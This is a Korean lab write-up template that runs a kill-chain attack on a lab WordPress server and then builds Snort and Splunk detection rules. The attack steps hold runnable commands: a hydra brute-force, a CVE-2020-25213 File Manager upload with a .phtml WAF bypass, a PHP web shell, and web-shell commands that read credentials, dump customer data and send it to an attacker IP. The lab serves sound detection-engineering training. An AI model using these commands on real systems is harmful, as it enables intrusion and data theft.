# Phase 3 — 킬체인 공격 + 탐지 엔지니어링

> 테크솔루션 WordPress 홈페이지 대상 킬체인 공격 수행 및 커스텀 탐지 규칙 구축

---

## 공격 시나리오

**"외부 해커가 회사 홈페이지를 통해 고객 DB 탈취 시도"**

| 단계 | Kill Chain | MITRE ATT&CK | 공격 행위 | 도구 |
|------|-----------|-------------|----------|------|
| 1 | 정찰 | T1595 Active Scanning | WordPress 버전·플러그인 스캔 | wpscan, nmap |
| 2 | 초기 침투 | T1190 Exploit Public-Facing App | 취약 플러그인 SQLi, File Manager 취약점 | sqlmap, 수동 |
| 3 | 인증 공격 | T1110 Brute Force | wp-login.php / xmlrpc.php 브루트포스 | hydra, wpscan |
| 4 | 지속성 확보 | T1505.003 Web Shell | PHP 웹쉘 업로드 (.phtml WAF 우회) | File Manager CVE |
| 5 | 내부 정찰 | T1046 Network Service Scanning | 웹쉘에서 내부 네트워크 스캔 | 웹쉘 CLI |
| 6 | DB 접근 | T1213 Data from Information Repos | MySQL 직접 접근, 고객 데이터 조회 | mysql CLI |
| 7 | 유출 시도 | T1041 Exfiltration Over C2 | 데이터 외부 전송 시도 | curl, wget |

---

## Step 1. 킬체인 공격 수행

### 1-1. 정찰 (Reconnaissance)

**wpscan 스캔:**
```bash
# Kali (10.50.50.30)
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --api-token [TOKEN]
```

**결과:**
<!-- 실습 후 기록 -->

**탐지 확인:**
- Apache access.log: <!-- 로그 확인 -->
- Snort: <!-- 경보 확인 -->
- ModSecurity: <!-- WAF 로그 확인 -->

---

### 1-2. SQL Injection (초기 침투)

**수동 SQLi:**
```bash
# WordPress 검색 기능 또는 플러그인 파라미터 대상
sqlmap -u "http://10.0.0.254:8080/?s=test" --dbs
```

**결과:**
<!-- 실습 후 기록 -->

**다중 소스 탐지 확인:**
- Snort: <!-- ET WEB_SERVER 경보 -->
- ModSecurity: <!-- 942xxx 탐지 로그 (차단 안 됨, DetectionOnly) -->
- Apache access.log: <!-- 비정상 파라미터 -->

---

### 1-3. 브루트포스 (인증 공격)

**wp-login.php 브루트포스:**
```bash
# Kali
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    10.0.0.254 http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -s 8080
```

**xmlrpc.php 멀티콜:**
```bash
curl -X POST http://10.0.0.254:8080/xmlrpc.php -d '
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-4. 웹쉘 업로드 (지속성)

**WP File Manager CVE-2020-25213:**
```bash
# .phtml로 WAF 우회
curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
    -F "cmd=upload" \
    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
    -F "upload[]=@shell.phtml"
```

**웹쉘 내용 (shell.phtml):**
```php
<?php if(isset($_GET['cmd'])) echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-5. 내부 정찰 (웹쉘 통해)

```bash
# 웹쉘에서 실행
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=ifconfig"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=cat+/etc/passwd"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=nmap+-sn+10.0.100.0/24"
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-6. DB 접근 (고객 데이터)

```bash
# 웹쉘에서 MySQL 접근 (wp-config.php에서 인증정보 획득)
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=cat+/var/www/html/wp-config.php"
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+-e+'SELECT+*+FROM+wordpress.wp_customers+LIMIT+10'"
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-7. 유출 시도 (차단 확인)

```bash
# 웹쉘에서 외부 전송 시도 → DMZNET 아웃바운드 차단에 의해 실패
curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.50.50.17:8888/exfil+-d+@/tmp/data.csv"
```

**결과:**
<!-- 차단 확인 후 기록 -->

---

## Step 2. 커스텀 탐지 규칙 구축

### Snort 커스텀 룰

`phase2.5-setup/configs/snort/local.rules`에 정의된 9개 룰 적용 후 탐지 테스트.

| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 |
|-----|---------|-----------|----------|
| 1000001 | WP Login Brute Force | 인증 공격 | <!-- 결과 --> |
| 1000002 | XML-RPC Brute Force | 인증 공격 | <!-- 결과 --> |
| 1000003 | PHP File Upload | 지속성 | <!-- 결과 --> |
| 1000004 | PHTML WAF Bypass | 지속성 | <!-- 결과 --> |
| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | <!-- 결과 --> |
| 1000006 | DMZ→Mng Access | 내부 정찰 | <!-- 결과 --> |
| 1000007 | Webshell Output | 지속성 | <!-- 결과 --> |
| 1000008 | WP File Manager CVE | 초기 침투 | <!-- 결과 --> |
| 1000009 | WPScan Detection | 정찰 | <!-- 결과 --> |

### Splunk 상관분석 룰

**1. 브루트포스 탐지 (행위 기반):**
```spl
index=idx_web sourcetype=apache:access uri="/wp-login.php" method=POST
| stats count by src_ip
| where count > 10
| rename src_ip as "공격자 IP", count as "시도 횟수"
```

**2. SQLi 다중 소스 교차 검증:**
```spl
index=pfsense "SQL" OR index=idx_waf "942"
| eval source_type=if(index="pfsense","Snort","ModSecurity")
| stats count by source_type, src_ip
| where count > 5
```

**3. 비정상 PHP 파일 접근 (웹쉘 의심):**
```spl
index=idx_web sourcetype=apache:access uri="*.phtml" OR uri="*/uploads/*.php"
| stats count by src_ip, uri
| where count > 1
```

---

## Step 3. 탐지 개선 비교

| 공격 | 기본 ET Open | 커스텀 룰 후 | 개선점 |
|------|-------------|------------|--------|
| WP 브루트포스 | ❌ 미탐지 | <!-- 결과 --> | threshold 기반 |
| 웹쉘 업로드 | ⚠️ 일부 | <!-- 결과 --> | 확장자 기반 강화 |
| 내부 스캔 | ❌ 미탐지 | <!-- 결과 --> | DMZ→inner 정책 |
| SQLi | ✅ Snort 탐지 | <!-- 결과 --> | + WAF 교차 검증 |
| File Manager CVE | ❌ 미탐지 | <!-- 결과 --> | URI 패턴 매칭 |

---

## Step 4. 정탐/오탐 판별

| 경보 | 출처 | 판별 | 근거 |
|------|------|------|------|
| <!-- 실습 후 기록 --> | | | |

---

## 스크린샷

- [ ] wpscan 스캔 결과
- [ ] SQLi 공격 + ModSecurity 로그
- [ ] 브루트포스 + 커스텀 Snort 경보
- [ ] 웹쉘 업로드 성공
- [ ] 내부 정찰 (ifconfig, nmap)
- [ ] DB 데이터 조회
- [ ] 유출 시도 차단
- [ ] Splunk 상관분석 대시보드
- [ ] 탐지 개선 전/후 비교
